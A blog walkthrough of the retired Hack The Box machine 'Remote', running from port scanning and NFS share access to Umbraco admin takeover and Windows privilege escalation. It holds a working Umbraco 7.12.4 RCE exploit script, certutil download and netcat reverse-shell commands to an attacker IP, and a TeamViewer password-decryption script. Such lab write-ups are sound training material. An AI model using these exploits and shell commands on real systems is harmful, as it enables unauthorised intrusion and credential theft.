---
layout: post
title: "Remote: Hack The Box Walkthrough"
date: 2020-09-05 16:59:01 +0000
last_modified_at: 2020-09-05 16:59:01 +0000
category: Walkthrough
tags: ["Hack The Box", Remote, retired, Windows, Easy]
comments: true
image:
  feature: remote-htb-walkthrough.png
---

This post documents the complete walkthrough of Remote, a retired vulnerable [VM][1] created by [mrb3n][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Remote is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.180 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-03-25 03:47:17 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 445/tcp on 10.10.10.180
Discovered open port 49666/tcp on 10.10.10.180
Discovered open port 2049/tcp on 10.10.10.180
Discovered open port 135/tcp on 10.10.10.180
Discovered open port 21/tcp on 10.10.10.180
Discovered open port 80/tcp on 10.10.10.180
Discovered open port 49678/tcp on 10.10.10.180
Discovered open port 49679/tcp on 10.10.10.180
Discovered open port 5985/tcp on 10.10.10.180
Discovered open port 47001/tcp on 10.10.10.180
Discovered open port 111/tcp on 10.10.10.180
Discovered open port 49665/tcp on 10.10.10.180
Discovered open port 49667/tcp on 10.10.10.180
Discovered open port 49680/tcp on 10.10.10.180
Discovered open port 49664/tcp on 10.10.10.180
Discovered open port 139/tcp on 10.10.10.180
```

Interesting list of open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p21,80,111,135,139,445,2049,5985 -A --reason 10.10.10.180 -oN nmap.txt
...
PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
2049/tcp open  mountd        syn-ack ttl 127 1-3 (RPC #100005)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```

RPC is certainly rare to see in a Windows machine. In any case, anonymous FTP is allowed but there's nothing in it. Here's what the site looks like.

{% include image.html image_alt="78387845.png" image_src="/c22eded2-81a5-4157-b7f5-5908ca4988d7/78387845.png" %}

### Network File System

Notice that `2049/tcp` is open? That's for network file system (NFS). We can use `showmount` to view the export list of NFS.

```
# showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```

Let's mount that and see what we've got.

{% include image.html image_alt="be81ceb8.png" image_src="/c22eded2-81a5-4157-b7f5-5908ca4988d7/be81ceb8.png" %}

Looks like Umbraco is in use!

{% include image.html image_alt="63bd22de.png" image_src="/c22eded2-81a5-4157-b7f5-5908ca4988d7/63bd22de.png" %}

### Umbraco 7.12.4

Since this box is rated as "Easy", we shouldn't need to go too far to gain a foothold. First up, let's determine the version of Umbraco installed in `Web.config`.

{% include image.html image_alt="a224406e.png" image_src="/c22eded2-81a5-4157-b7f5-5908ca4988d7/a224406e.png" %}

The database in use is a SQL Server Compact (SQL CE) file.

{% include image.html image_alt="21d7323d.png" image_src="/c22eded2-81a5-4157-b7f5-5908ca4988d7/21d7323d.png" %}

Also, in `Web.config` the password format is **Hashed**. I suppose that means the password hash can be found in the database?

{% include image.html image_alt="75d8b2f1.png" image_src="/c22eded2-81a5-4157-b7f5-5908ca4988d7/75d8b2f1.png" %}

I don't suppose that's the password hash for `admin@htb.local`? There's only one way to find out.

{% include image.html image_alt="8ed91065.png" image_src="/c22eded2-81a5-4157-b7f5-5908ca4988d7/8ed91065.png" %}

We have creds??!!

{% include image.html image_alt="d7d9a11b.png" image_src="/c22eded2-81a5-4157-b7f5-5908ca4988d7/d7d9a11b.png" %}

And we are in.

{% include image.html image_alt="8765aca2.png" image_src="/c22eded2-81a5-4157-b7f5-5908ca4988d7/8765aca2.png" %}

### Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution

Armed with the administrator credentials, we can make use of EDB-ID [46153](https://www.exploit-db.com/exploits/46153) for remote code execution. I do need to clean up the code a little though.

<div class="filename"><span>exploit.py</span></div>

```python
import requests
import sys

from bs4 import BeautifulSoup

print("[!] Start");

# Execute a calc for the PoC
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "/c ' + sys.argv[1] + '"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> '

print("[*] Sending payload")

login = "admin@htb.local"
password="baconandcheese"
host = "10.10.10.180";

# Step 0 - Set up session
s = requests.Session()

# Step 1 - Process Login
url_login = "http://" + host + "/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"
loginfo = {"username":login,"password":password}
r1 = s.post(url_login,json=loginfo)

# Step 2 - Go to vulnerable web page
url_xslt = "http://" + host + "/umbraco/developer/Xslt/xsltVisualize.aspx"
r2 = s.get(url_xslt)

soup = BeautifulSoup(r2.text, 'html.parser')
VIEWSTATE = soup.find(id="__VIEWSTATE")['value']
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value']
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN']
headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN}
data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"}

# Step 3 - Launch the attack
r3 = s.post(url_xslt,data=data,headers=headers)

print("[!] End")
```

## Low-Privilege Shell

Let's transfer a copy of `nc.exe` from Kali Linux using `certutil.exe`.

```
# python3 exploit.py 'certutil -urlcache -split -f http://10.10.16.125/nc.exe \\windows\\system32\\spool\\drivers\\color\\cute.exe'
```

And run a reverse shell back to us.

```
# python3 exploit.py 'start \\windows\\system32\\spool\\drivers\\color\\cute.exe 10.10.16.125 4444 -e cmd.exe'
```

{% include image.html image_alt="5ac084e3.png" image_src="/c22eded2-81a5-4157-b7f5-5908ca4988d7/5ac084e3.png" %}

Bam. And the file `user.txt` is at `C:\Users\Public`.

{% include image.html image_alt="b4f1aa95.png" image_src="/c22eded2-81a5-4157-b7f5-5908ca4988d7/b4f1aa95.png" %}

## Privilege Escalation

During enumeration of this account, I noticed that TeamViewer 7 is installed and running as a service.

{% include image.html image_alt="dbd93457.png" image_src="/c22eded2-81a5-4157-b7f5-5908ca4988d7/dbd93457.png" %}

### CVE-2019-18988 - Shared AES key for TeamViewer < 14.7.1965

True enough, sensitive information about TeamViewer can be gleaned from the registry like so.

```
reg query hklm\software\teamviewer /s
```

{% include image.html image_alt="8b1989f5.png" image_src="/c22eded2-81a5-4157-b7f5-5908ca4988d7/8b1989f5.png" %}

According to this blog [post](https://whynotsecurity.com/blog/teamviewer/),

> TeamViewer stored user passwords encrypted with AES-128-CBC with they key of `0602000000a400005253413100040000` and iv of `0100010067244F436E6762F25EA8D704` in the Windows registry.


Armed with this information, I wrote a simple decryption script driven by `openssl enc` to decrypt `SecurityPasswordAES`.

<div class="filename"><span>decrypt.sh</span></div>

```shell
#!/bin/bash

ENCPASS=$1
KEY=0602000000a400005253413100040000
IV=0100010067244F436E6762F25EA8D704

echo -n $ENCPASS \
| xxd -p -r \
| openssl enc -aes-128-cbc -d -nopad -K $KEY -iv $IV; echo
```

Let's give it a shot.

{% include image.html image_alt="d65bd313.png" image_src="/c22eded2-81a5-4157-b7f5-5908ca4988d7/d65bd313.png" %}

Of course!

### Getting `root.txt`

Armed with this password, we can get an `Administrator` shell with Evil-WinRM.

{% include image.html image_alt="a56ca688.png" image_src="/c22eded2-81a5-4157-b7f5-5908ca4988d7/a56ca688.png" %}

Getting `root.txt` is easy.

{% include image.html image_alt="8bc25b52.png" image_src="/c22eded2-81a5-4157-b7f5-5908ca4988d7/8bc25b52.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/234
[2]: https://www.hackthebox.eu/home/users/profile/2984
[3]: https://www.hackthebox.eu/
